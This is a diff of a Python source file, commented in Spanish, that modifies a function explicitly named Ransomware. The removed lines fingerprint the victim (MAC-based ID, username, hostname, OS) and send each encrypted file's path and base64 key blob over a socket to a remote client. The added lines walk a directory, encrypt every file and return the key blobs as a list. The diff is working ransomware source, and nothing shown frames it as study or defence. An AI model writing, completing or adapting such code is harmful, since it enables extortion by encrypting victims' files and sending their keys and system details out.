@@ -286,38 +286,21 @@ def encrypt_file(file_path, delete_original=True):
 #  EJECUCION Y ENVÍO POR RED
 # ==========================================================
 
-def Ransomware(directory_path, client):
-    try:
-        mac = get_mac_address()
-
-        if mac:
-            victim_id = hashlib.sha256(mac.encode()).hexdigest()
-        else:
-            victim_id = str(uuid.uuid4())
-        
-        initial_data = {
-            "type": "initial_info",
-            "victim_id": victim_id,
-            "username": getpass.getuser(),
-            "hostname": socket.gethostname(),
-            "os_info": f"{platform.system()} {platform.release()}",
-        }
-
-        client.sendall(json.dumps(initial_data).encode() + b"\n")
-        logger.info(f"Información inicial enviada para victim_id: {victim_id}")
-
-    except socket.error as e:
-        logger.error(f"Error de socket al enviar datos iniciales: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"Error inesperado en envío inicial: {type(e).__name__} - {e}")
-        return None
-
+def Ransomware(directory_path):
+    """
+    Cifra todos los archivos en el directorio especificado.
+    Retorna una lista con la información criptográfica (blobs) de cada archivo.
+    """
+    
+    logger.info(f"Iniciando proceso de cifrado en: {directory_path}")
+    
+    # Lista para almacenar información de archivos cifrados
+    encrypted_files = []
     count = 0
 
     for root, _, files in os.walk(directory_path):
         for name in files:
-            # Omisiones críticas
+            # Omitir archivos ya cifrados y temporales
             if name.endswith(".enc"):
                 continue
             if name.startswith(".tmp_enc_"):
@@ -338,30 +321,25 @@ def Ransomware(directory_path, client):
                     logger.warning(f"Fallo al cifrar: {path}")
                     continue
 
-                payload = {
-                    "type": "file",
-                    "victim_id": victim_id,
-                    "original_path": path,        
-                    "encrypted_path": enc_path,  
-                    "key_blob": base64.b64encode(key_blob).decode(),
+                # Almacenarla información criptográfica
+                file_info = {
+                    "original_path": path,
+                    "encrypted_path": enc_path,
+                    "key_blob": base64.b64encode(key_blob).decode()
                 }
-
-                client.sendall(json.dumps(payload).encode() + b"\n")
+                
+                encrypted_files.append(file_info)
                 count += 1
-                logger.info(f"Cifrado y enviado [{count}]: {path}")
+                logger.info(f"Cifrado exitoso [{count}]: {path}")
 
-            except socket.error as e:
-                logger.error(f"Error de socket enviando {path}: {e}")
-                continue
-            except json.JSONDecodeError as e:
-                logger.error(f"Error JSON para {path}: {e}")
-                continue
             except Exception as e:
                 logger.error(f"Error inesperado procesando {path}: {type(e).__name__} - {e}")
                 continue
 
     logger.info(f"Proceso completado. Total archivos cifrados: {count}")
-    return count
+    
+    # Retornar solo la lista de archivos con sus blobs
+    return encrypted_files
 
 
 
